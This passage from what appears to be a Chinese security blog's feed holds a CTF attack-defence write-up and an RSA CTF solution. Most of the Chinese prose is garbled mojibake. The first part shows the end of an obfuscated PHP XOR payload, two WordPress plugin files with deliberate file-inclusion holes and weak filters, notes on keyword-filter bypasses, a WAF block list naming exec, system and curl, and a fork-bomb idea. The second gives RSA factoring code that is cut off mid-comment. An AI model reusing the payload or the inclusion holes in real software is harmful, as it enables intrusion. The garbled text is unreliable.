class="string">"|"</span>)&#125;((<span class="string">"-"</span> ^ <span class="string">"H"</span>) . (<span class="string">"]"</span> ^ <span class="string">"+"</span>) . (<span class="string">"["</span> ^ <span class="string">":"</span>) . (<span class="string">","</span> ^ <span class="string">"@"</span>) . (<span class="string">"&#125;"</span> ^ <span class="string">"U"</span>) . (<span class="string">"~"</span> ^ <span class="string">"&gt;"</span>) . (<span class="string">"e"</span> ^ <span class="string">"A"</span>) . (<span class="string">"("</span> ^ <span class="string">"w"</span>) . (<span class="string">"j"</span> ^ <span class="string">":"</span>) . (<span class="string">"i"</span> ^ <span class="string">"&amp;"</span>) . (<span class="string">"#"</span> ^ <span class="string">"p"</span>) . (<span class="string">"&gt;"</span> ^ <span class="string">"j"</span>) . (<span class="string">"!"</span> ^ <span class="string">"z"</span>) . (<span class="string">"]"</span> ^ <span class="string">"&gt;"</span>) . (<span class="string">"@"</span> ^ <span class="string">"-"</span>) . (<span class="string">"["</span> ^ <span class="string">"?"</span>) . (<span class="string">"?"</span> ^ <span class="string">"b"</span>) . (<span class="string">"]"</span> ^ <span class="string">"t"</span>));</span><br></pre></td></tr></table></figure><p>ÂêéÊù•ÂèëÁé∞‰∏§Â§ÑÊñá‰ª∂ÂåÖÂê´„ÄÇÂèØ‰ª•Âà©Áî®<code>./</code> Âíå<code>../</code> ÂàÜÈöîÂÖ≥ÈîÆÂ≠óÁªïËøáWAFÔºåÂõ†‰∏∫ÈÜíÊÇüÁöÑÊØîËæÉÊôöÂíåËá™Âä®ÂåñÂÅöÂæó‰∏çÂ§üÊñπ‰æøÔºåËøô‰∏™Ê≤°ÊúâÂèëÊå•Â§™Â§ß‰ΩúÁî®„ÄÇ</p><p><code>wwwroot\wordpress\wp-content\plugins\localize-my-post\ajax\include.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Include WP base to have the basic WP functions</span></span><br><span class="line"><span class="keyword">include_once</span>($_SERVER[<span class="string">'DOCUMENT_ROOT'</span>] . <span class="string">"/wp-blog-header.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Set status 200 header</span></span><br><span class="line"><span class="comment">//Include requested file if it exists</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]))&#123;</span><br><span class="line">$file=$_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">$file = str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$file);</span><br><span class="line">header(<span class="string">'HTTP/1.1 200 OK'</span>);</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âíå <code>wwwroot\wordpress\wp-content\plugins\site-editor\editor\extensions\pagebuilder\includes\ajax_shortcode_pattern.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[<span class="string">'ajax_path'</span>] ) )&#123;</span><br><span class="line">$ajax_path=$_REQUEST[<span class="string">'ajax_path'</span>];</span><br><span class="line">$ajax_path = str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$ajax_path);</span><br><span class="line">    <span class="keyword">require_once</span> $ajax_path;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Ê≠§Â§ñÔºåÊúâ‰∫õÈòü‰ºçËøáÊª§‰∫ÜsystemÔºåexeÁ≠âÂÖ≥ÈîÆÂ≠óÔºåÈááÁî®ÂèçÂºïÂè∑Ôºåbase64ÁºñÁ†ÅÔºårot13ÁºñÁ†ÅÁ≠âÂ∞ùËØïÁªïËøá„ÄÇ</p><p>‰πüËÆ∏Âõ†‰∏∫checkÊú∫Âà∂‰∏çÂ•Ω‰ΩøÔºåÊüê‰∏™Êó∂Èó¥ÂºÄÂßãÂ§ßÁ∫¶‰∏ÄÂçä‰ª•‰∏äÁöÑÈòü‰ºçÈÄâÊã©ÂÖ≥Á´ô‰øùÂπ≥ÂÆâÔºåÂç≥‰ΩøÂè™ÊòØËÆøÈóÆÂØπÊñπ‰∏ªÈ°µ‰πü‰ºöË¢´WAFÊã¶Êà™„ÄÇËøô‰∏çÈöæÂÆûÁé∞ÔºåÂè™Ë¶ÅÂú®WAFÈáåÈù¢ÊääIPÂΩìÂÖ≥ÈîÆÂ≠óËøáÊª§ÊéâÂ∞±ÂèØ‰ª•„ÄÇËøôÂ§ßÊ¶Ç‰∏çÂ§™ÂéöÈÅìÂêßÔºå‰ΩÜÈªëÂÆ¢ÂòõÔºå‰πüËÆ∏Â∞±ÊòØÁêÜËß£Âπ∂ÊâìÂáªËßÑÂàôÔºü</p><p>Ê≤°ÊåñÂá∫Âï•Ê¥ûÔºåÊàëÂ•ΩËèúÂïä„ÄÇËÄå‰∏îWAFËøô‰πàÂº∫ÔºåÊåñÂá∫Êù•‰πüÁî®‰∏ç‰∏äÂêß„ÄÇ</p><p><strong>defense</strong> </p><p>‰∏ÄÂºÄÂßãÂ∞±Âú®WAF‰∏äÊääDÁõæÊâ´Âá∫Êù•ÁöÑÂá†‰∏™ÂèØÁñëÊñá‰ª∂Âä†ÂÖ•ÈªëÂêçÂçïÔºåÂêéÊù•ÂèàÈÖç‰∫ÜÊïèÊÑüÂÖ≥ÈîÆÂ≠ó<code>exec|system|exe|curl|flag|base64|filter|cmd|-7|{|rot13</code> Á≠âÔºåÊâÄ‰ª•WebÂü∫Êú¨Âè™Âú®ÂàöÂºÄÂßãÁöÑÂá†ËΩÆÂ§±ÂàÜ„ÄÇ</p><p>ÂÖ®Á®ãÂ∞±ÊòØÊØèËΩÆÊâì‰∏Ä‰∏ãÔºåÁúãÁúãWAFÊúâÊ≤°Êã¶Âà∞ÊúâË∂£ÁöÑ‰∏úË•øÔºåÊå£ÊâéÁùÄËØïÂõæÊåñÂà∞Ê¥ûÔºå‰ª•ÂèäÂ∞ùËØï‰∏Ä‰∫õÁªïËøáÂÖ≥ÈîÆÂ≠óÁöÑÊñπÊ≥ï„ÄÇ</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><strong>attack</strong> </p><p>Âõ†‰∏∫WebÊâãÊØîËæÉËèú:(ÔºåPWNÊâãÂ∏ÆÂøôÁúã‰∫ÜÂçäÂ§©WebÔºåÂºÄÂßãÊêûPWNÁöÑÊó∂Èó¥ÊØîËæÉÊôöÔºåÂøÉÊÄÅÊúâÁÇπÂ¥©ÔºåÊúÄÂêéÊÄùË∑ØÊù•ÂæóÊôöÔºåÂÖ®Á®ãÊ≤°ÊâìÂá∫ÂàÜÔºåÂæàÂèØÊÉú„ÄÇ‰πüËÆ∏ÂêéÈù¢Á†îÁ©∂‰∏ãÁéãÂçöÁöÑWPÂÜçÂ§çÁé∞‰∏Ä‰∏ã„ÄÇ</p><p><strong>defense</strong> </p><p>ÊùÉÈôêÈóÆÈ¢òÂä®‰∏ç‰∫ÜPWNÊñá‰ª∂ÔºåpatchÊó†Èó®ÔºåÂü∫Êú¨ÂùêÁùÄÊå®Êâì„ÄÇÂêåÊ†∑ÂèØËÉΩÂõ†‰∏∫checkÊú∫Âà∂ÁöÑÈóÆÈ¢òÔºåÂ≠òÂú®‰∏Ä‰∏™forkÁÇ∏ÂºπË∫∫‰∏ãË£ÖÊ≠ªÁöÑÈò≤Âæ°ÊÄùË∑Ø„ÄÇ</p><h1 id="Êå®ÊâìË¶ÅÁ´ãÊ≠£"><a href="#Êå®ÊâìË¶ÅÁ´ãÊ≠£" class="headerlink" title="Êå®ÊâìË¶ÅÁ´ãÊ≠£"></a>Êå®ÊâìË¶ÅÁ´ãÊ≠£</h1><p>ÊãøÂà∞‰∏§‰∏™Á¨¨‰∫åÁ°ÆÂÆûÊòØËµõÂâçÊ≤°ÊÉ≥Âà∞ÁöÑÔºå‰ΩÜËøôÊîπÂèò‰∏ç‰∫ÜÊàëËèúÁöÑÊú¨Ë¥®„ÄÇÈòüÂèã‰ª¨ËôΩÁÑ∂ÊØîÊàëÂº∫Ôºå‰ΩÜÊòØ‰πü‰æùÁÑ∂ÊúâÂæàÂ§ßËøõÊ≠•Á©∫Èó¥ÔºåÂåÖÊã¨Êõ¥ÊâéÂÆûÁöÑÂü∫Á°ÄÔºåÊõ¥ÁÜüÁªÉÁöÑÊìç‰ΩúÔºåÊõ¥ÁÅµÊ¥ªÁöÑÊÄùË∑ØÔºåÊõ¥ÈªòÂ•ëÁöÑÈÖçÂêàÁ≠âÁ≠â„ÄÇ</p><p>Á¨¨‰∏ÄÂ§©Á™ÅÂõ¥ËµõÂàöÂºÄÂßãÊØîËæÉÈ°∫Âà©ÔºåÊúÄÂêé‰∫îÂàÜÈíüË¢´Â§úÂΩ±Â∏àÂÇÖÊâÄÂú®Èòü‰ºçÂèçË∂ÖÔºåÊîæ‰∏ä‰ªñ‰ª¨ÁöÑÈÄÜÂêëwriteupÔºö<a href="https://blog.csdn.net/whklhhhh/article/details/84454534" target="_blank" rel="noopener">181124 ÈÄÜÂêë-2018‚ÄúÊüèÈπ≠ÊùØ‚ÄùÂé¶Â§ßÈÇÄËØ∑ËµõÂàùËµõÔºàRe1„ÄÅ2Ôºâ</a> Ôºå‰ª•Âº•Ë°•Êú¨Êñá‰∏çË∂≥„ÄÇ</p><p>Á¨¨‰∫åÂ§©AWDÂàôÂÖ®Á®ãË¢´ÂåóËà™ÂêäÊâìÔºå‰ºèÂú∞ËÜú„ÄÇ</p><p><del>Âõ†‰∏∫ÁúãÂà∞ÊüêÁæ§ÈáåÊúâ‰∫∫ÂêêÊßΩËøôÊòØÂûÉÂúæÊØîËµõÔºåÊàëËßâÂæóËøô‰∏™ËØ¥Ê≥ï‰∏çÂ§™Ë¥üË¥£‰ªªÔºåÊâÄ‰ª•‰Ωú‰∏∫Âé¶Â§ßÂ≠¶ÁîüÂ§öËØ¥‰∏§Âè•„ÄÇ‰ªéÈ¢òÁõÆÊù•ËØ¥„ÄÇcrypto‰∏ÄÈ¢òÊúâÁÇπËÑëÊ¥ûÔºå‰∏ÄÈ¢òÁÆÄÂçïÔºå‰∏ÄÈ¢ò‰∏≠Á≠âÔºåÂèØ‰ª•Êé•ÂèóÔºåmisc‰πüÊòØÁõ∏ÂØπÂêàÊ†ºÁöÑÔºåWebÈ¢òÊÄùË∑ØÊ∏ÖÊô∞Ôºå‰πüÊúâÊúâË∂£ÁöÑ‰∏úË•ø„ÄÇreverseÔºåPWN‰∏≠‰πü‰∏ç‰πèË¥®Èáè‰∏çÈîôÁöÑÈ¢òÔºåÂÅöÂá∫È¢òÁöÑÂ∏àÂÇÖ‰πüÊòØËÆ§ÂèØÂÖ∂ÊúâËá™Â∑±ÁâπÁÇπÁöÑ„ÄÇ</del></p><p><del>Èô§‰∫ÜÈ¢òÁõÆÔºåÊØîËµõÂ•ñÈáë‰πüÊòØÂæàÈ´òÁöÑÔºåÈó≠ÂπïÂºèÂà∞Âú∫ÁöÑÂòâÂÆæ‰πüÊòØÂ§üÁ∫ßÂà´ÁöÑÔºåÊØîËµõÁéØÂ¢ÉÂèØ‰ª•ËØ¥Áõ∏ÂΩì‰∏çÈîôÔºå‰ΩèÂÆø‰∫§ÈÄö‰πüÂæà‰∫∫ÊÄßÂåñ„ÄÇ‰ªéÂêÑ‰∏™ËßíÂ∫¶Êù•ËØ¥ÔºåËøôÈÉΩÂèØ‰ª•ÁÆóÊòØ‰∏ÄÂú∫ÊúâËØöÊÑèÁöÑÔºåÊúâÊÑøÊúõÂäûÂ•Ω‰∏îÁ°ÆÂÆûÂÅöÂæó‰∏çÈîôÁöÑÊØîËµõ„ÄÇÊâÄ‰ª•‰∏çÁÆ°ÊòØÂõ†‰∏∫Ê≤°Ë¢´ÈÇÄËØ∑„ÄÅÂÅö‰∏çÂá∫È¢ò„ÄÅÁ°ÆÂÆûÊÑüËßâÈ¢òÁõÆË¥®Èáè‰∏çË°å„ÄÅÁé∞Âú∫ÂéïÊâÄ‰∏çÂ§üÁî®„ÄÅÂøóÊÑøËÄÖÈáåÈù¢ÊºÇ‰∫ÆÂ∞èÂßêÂßê‰∏çÂ§üÂ§öËøòÊòØÂÖ∂‰ªñ‰ªÄ‰πàÂéüÂõ†ËÄåËßâÂæó‰∏çÁàΩÁöÑÔºåÂêêÊßΩÊó∂ÊääËØùËØ¥Ê∏ÖÊ•öËøòÊòØÊØîËæÉÂ•ΩÁöÑÔºåÂÖçÂæóÂºïËµ∑‰∏çÂøÖË¶ÅÁöÑËØØËß£„ÄÇÊòéÂπ¥Â∫îËØ•Ëøò‰ºö‰∏æÂäûÔºåÊ¨¢ËøéË∑ØËøáÁöÑÂ§ß‰Ω¨Êù•Áé©„ÄÇ</del></p><p><del>ÂΩìÁÑ∂ÔºåË¶ÅÊîπËøõÁöÑ‰∏úË•øËøòÊòØËõÆÂ§öÁöÑÔºåÂèçÊÄù‰∏çÂ∫îËØ•Áî±ÊàëÊù•ÂÅöÔºåÁÆÄÂçïËØ¥ÁÇπËá™Â∑±ÁöÑÊÑüÂèó„ÄÇÊúÄ‰∏çÁêÜÊÉ≥ÁöÑÂ§ßÊ¶ÇÊòØAWDÁöÑcheckÔºåËøô‰∏™Áß∞‰∏∫ÂÅ•Â∫∑Ê£ÄÊü•ÁöÑ‰∏úË•øÂ•ΩÂÉèÂàÜ‰∏çÊ∏ÖÊÄéÊ†∑ÊòØÂÅ•Â∫∑„ÄÇÂÖ∂Ê¨°ÊòØ‰ΩøÁî®WAF‰Ωú‰∏∫WebÈò≤ÂÆàÁöÑÂ∑•ÂÖ∑Âõ∫ÁÑ∂ÂèØ‰ª•ËÆ©Âç≥‰ΩøÊòØÂÉèÊàëËøôÊ†∑ÁöÑAWDÁªèÈ™å‰∏çË∂≥ÁöÑÈÄâÊâãÈÉΩÂèØ‰ª•ÂæàËàíÊúçÔºå‰πüÂáèËΩªÁª¥Êä§ÂéãÂäõÔºå‰ΩÜËøôÊ†∑ÊòØÊ≤°Ê≥ïÊâìÂá∫Âà∫ÊøÄÁöÑAWDÁöÑÔºåÂÜçÂä†‰∏ächeckÂíåÊàë‰∏ÄÊ†∑ËèúÔºåÈô§‰∫ÜÊ≤°ÊêûÊ∏ÖÊ•öÁä∂ÂÜµÁöÑÈÄâÊâãÔºåÊúâÂùöÂÆöÂéüÂàôÁöÑÈÄâÊâãÔºåÂæàÂèØËÉΩÂá∫Áé∞ÂÖ®Âú∫ÂÖ®Á∫øWAFÔºåÈÇ£Â∞±Ê≤°Âï•Â•ΩÊâìÁöÑ‰∫Ü„ÄÇÊúÄÂêéÊòØPWNÊ≤°ÊúâÁªôÈÄâÊâãpatchÁöÑÊùÉÈôêÔºåËøôÊòØ‰∏çÂ§™Ê≠£Â∏∏ÁöÑÔºåÁõ¥Êé•ÂØºËá¥ÊúÄÂ•ΩÁöÑÈò≤Êä§ÊòØÊääËá™Â∑±ÊêûdownÔºå‰∏çÁÆ°‰∏ªÂäûÊñπÊòØÂá∫‰∫éÁª¥Êä§ÈöæÂ∫¶ËÄÉËôëËøòÊòØ‰ªÄ‰πàÔºåÂØπÁúüÊ≠£ÊúâËÉΩÂäõ‰∏îÊÉ≥Êâì‰∏ÄÂú∫ÊúâÊÑèÊÄùÁöÑÊØîËµõÁöÑÈÄâÊâãÊù•ËØ¥Ê∏∏Êàè‰ΩìÈ™åÊòØ‰∏çÂ§™Â•ΩÁöÑ„ÄÇÊâÄ‰ª•Â¶ÇÊûúÊè™‰ΩèËøôÂá†ÁÇπÂèëË°®ÊØîËæÉ‰∏•ÂéâÁöÑÊâπËØÑÁöÑËØùÊàëÊòØÊ≤°ËØùËØ¥ÁöÑüòî</del></p><p>ÊúÄÂêéÔºåÊÑüË∞¢ÈòüÂèãÂ∏¶È£û„ÄÇ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CTF&quot;&gt;&lt;a href=&quot;#CTF&quot; class=&quot;headerlink&quot; title=&quot;CTF&quot;&gt;&lt;/a&gt;CTF&lt;/h1&gt;&lt;h2 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Â¶ÇÊûúRSAÂä†ÂØÜ‰∏≠ÁöÑeÂíåphi‰∏ç‰∫íË¥®</title>
    <link href="https://findneo.github.io/181124-what-if-e-phi-not-coprime/"/>
    <id>https://findneo.github.io/181124-what-if-e-phi-not-coprime/</id>
    <published>2018-11-24T12:30:39.000Z</published>
    <updated>2019-01-25T23:21:37.215Z</updated>
    
    <content type="html"><![CDATA[<p>ËøôÊòØÂíåÂà´‰∫∫ÂÆ∂ÁöÑÂ≠¶Âºü‰∫§ÊµÅÁöÑ‰∏ÄÈÅìÈ¢òÔºåÊçÆÁß∞ÊòØ2018È´òÊ†°ÁΩëÁªú‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜËøêÁª¥ÊåëÊàòËµõÁöÑRSAÈ¢òÁõÆÔºåÂèØ‰ª•Â∏ÆÂä©ÁêÜËß£Âú®RSAÂä†ÂØÜÔºàÂßë‰∏îËøòËøôÊ†∑Áß∞ÂëºÂÆÉÂêßÔºâ‰∏≠ÂΩìÂä†ÂØÜÊåáÊï∞eÂíåÊ¨ßÊãâÂáΩÊï∞phi‰∏ç‰∫íË¥®ÁöÑÊó∂ÂÄôÊÑèÂë≥ÁùÄ‰ªÄ‰πàÔºå‰ª•ÂèäÂèØËÉΩÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ</p><p>Â¶ÇÊûúÊ≤°ÊúâÁêÜËß£ÈîôËØØÁöÑËØùÔºå‰∏ç‰∫íË¥®Âπ∂‰∏ç‰ºöÂØºËá¥Âä†ÂØÜ‰∏çÂÆâÂÖ®ÔºåÂè™ÊòØÊó†Ê≥ïËß£ÂØÜ‰∫ÜÔºåËÄå‰∏îÊòéÊñáÂíåÂØÜÊñáÂú®Ê®°Êï∞ËåÉÂõ¥ÂÜÖ‰πü‰∏çÂÜçÊòØ‰∏Ä‰∏ÄÂØπÂ∫î„ÄÇ</p><p>Ê≠§Êó∂Â¶ÇÊûúÊúâÂ§ö‰∏™Âä†ÂØÜËøáÁ®ãÔºå‰ªñ‰ª¨ÁöÑÊòéÊñámÂíåÂä†ÂØÜÊåáÊï∞eÁõ∏Á≠âÔºån‰∏çÁõ∏Á≠âÔºåÈÇ£‰πàÂè™Ë¶ÅËÉΩÂ§üÊûÑÂª∫‰∏ÄÂÆöÊï∞ÈáèÁöÑÂêå‰ΩôÂºèÔºåÂ∞±ÂèØ‰ª•Áî®‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÊ±ÇËß£ÔºåÁ±ª‰ºº‰∫éÂπøÊí≠ÊîªÂáª„ÄÇ</p><p>Âè¶‰∏ÄÁßçÊÄùË∑ØÂ∞±ÊòØÊú¨È¢òÁöÑÊÉÖÂÜµ„ÄÇÂ§ö‰∏™Âêå‰ΩôÂºè‰∏≠ÁöÑËã•Âπ≤‰∏™nÊòØÂèØÂàÜËß£ÁöÑÔºåÈÇ£‰πàÊéíÂàóÁªÑÂêà‰ªñ‰ª¨ÁöÑpÔºåqÔºå‰ª•‰ΩøÂæóÊüêÁßçÁªÑÂêàÁöÑphiËÉΩÂ§üÂíåe‰∫íË¥®ÔºåÁÑ∂ÂêéÂèØ‰ª•ÊääÊ®°Êï∞ÈôçÂà∞ËøôÁßçÁªÑÂêàÁöÑnÂÄºÔºåÂ∞±ÂèØ‰ª•Ëß£Âá∫ÊòéÊñá‰∫Ü„ÄÇÂΩìÁÑ∂ÔºåËøôÈ¢òÁöÑÊÉÖÂÜµÂ§ßÊ¶Ç‰∏çÊòØÂ∏∏ÊúâÁöÑ„ÄÇ</p><p>È¢òÁõÆÂÜÖÂÆπÂ¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span></span><br><span class="line">e1=<span class="number">0xfae3aL</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span></span><br><span class="line">e2=<span class="number">0x1f9eaeL</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> pow(flag,e1,n1)==c1</span><br><span class="line"><span class="keyword">assert</span> pow(flag,e2,n2)==c2</span><br><span class="line"><span class="keyword">assert</span> gcd(e1,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))==<span class="number">14</span></span><br><span class="line"><span class="keyword">assert</span> gcd(e2,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))==<span class="number">14</span></span><br></pre></td></tr></table></figure><p>Ëß£Á≠î‰ª£Á†ÅÂ¶Ç‰∏ãÔºå‰∏∫‰∫ÜÁªôÂ≠¶ÂºüÁúãÔºåÂÅö‰∫ÜÂÖ∑‰ΩìÁöÑÊ≥®Èáä„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># python 3.7</span></span><br><span class="line"><span class="comment"># __author__ = 'https://github.com/findneo'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factordb</span><span class="params">(n)</span>:</span></span><br><span class="line">    api=<span class="string">"http://factordb.com/api.php"</span></span><br><span class="line">    r=requests.get(api,params=&#123;<span class="string">'query'</span>:n&#125;)</span><br><span class="line">    res=json.loads(r.content)</span><br><span class="line">    <span class="keyword">if</span> res[<span class="string">'status'</span>] == <span class="string">"FF"</span>:</span><br><span class="line">        p,q=res[<span class="string">'factors'</span>][<span class="number">0</span>][<span class="number">0</span>],res[<span class="string">'factors'</span>][<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">        [p,q]=map(int,[p,q])</span><br><span class="line">        <span class="comment"># print('\n'.join([hex(p),hex(q)]))</span></span><br><span class="line">        <span class="keyword">return</span> p,q</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"not fully factored!"</span>)</span><br><span class="line"></span><br><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723</span></span><br><span class="line">e1=<span class="number">0xfae3a</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbea</span></span><br><span class="line">p1,q1=factordb(n1)</span><br><span class="line"><span class="comment"># p1=0xe5d7acdf77ca09e4391f21cea16c01cd2302d1a1df3983d413e9ee91fce8d9184ec0d0ca1608dbed748ed905a2beddc00168a1245f27f67e1240073c3d097965</span></span><br><span class="line"><span class="comment"># q1=0xe76aed4830504369c7c12070490f18900b80da1035ef82991dd35c52fd51731025c4498e8998bd026b9898963b6b69ded47b1dd96c264eac9d875756fd1b29e7</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63</span></span><br><span class="line">e2=<span class="number">0x1f9eae</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347</span></span><br><span class="line">p2,q2=factordb(n2)[::<span class="number">-1</span>]</span><br><span class="line"><span class="comment"># p2=0xeae0dfb99949af5175c425e22ec3c2e5b73cec0b70510dcc0ccd368ca6e868146c8783fa4aee0548fc725a3c3b0e46e44ec60357d3e6f4a5207e8a8ddf9c1225</span></span><br><span class="line"><span class="comment"># q2=0xe76aed4830504369c7c12070490f18900b80da1035ef82991dd35c52fd51731025c4498e8998bd026b9898963b6b69ded47b1dd96c264eac9d875756fd1b29e7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(q1==q2)</span><br><span class="line">q=q1</span><br><span class="line"><span class="comment"># n1,n2ÂùáÂèØÂàÜËß£Ôºå‰∏îÊúâ‰∏Ä‰∏™ÂÖ¨Âõ†Êï∞</span></span><br><span class="line"><span class="comment"># Áî±‰∫égcd(e,phi)==14ÔºåÂ∞Ü (flag**e)%n = c Áúã‰Ωú (((flag**14)%n) ** (e//14) ) % n == c</span></span><br><span class="line"><span class="comment"># ÂàÜÂà´ËÆ∞ e//14‰∏∫e1,e2 , (flag**14)%n1 ‰∏∫ f1 , (flag**14)%n2 ‰∏∫ f2,Âàô pow(f1,e1,n1)==c1,pow(f2,e2,n2)==c2 ‰∏î gcd(e1,phi1)==gcd(e2,phi2)==1„ÄÇÂèØÊ±ÇÂæó 